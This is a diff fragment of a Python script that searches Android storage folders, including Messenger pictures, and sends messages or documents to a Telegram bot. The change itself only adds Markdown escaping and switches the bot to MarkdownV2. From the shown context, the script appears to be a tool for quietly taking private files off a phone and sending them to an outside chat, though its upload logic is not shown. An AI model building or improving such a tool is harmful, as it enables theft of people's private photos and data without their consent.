@@ -15,13 +15,20 @@ directories_to_search = [
     "/storage/emulated/0/Pictures/Messenger"
 ]
 
+# Function to escape special characters for Telegram Markdown
+def escape_markdown(text):
+    escape_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
+    for char in escape_chars:
+        text = text.replace(char, f'\\{char}')
+    return text
+
 # Function to send message or document to Telegram
 def send_to_telegram(message, document=None):
     url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
     data = {
         "chat_id": CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
+        "text": escape_markdown(message),  # Escape special characters
+        "parse_mode": "MarkdownV2"  # Use MarkdownV2 for better support
     }
     
     try:
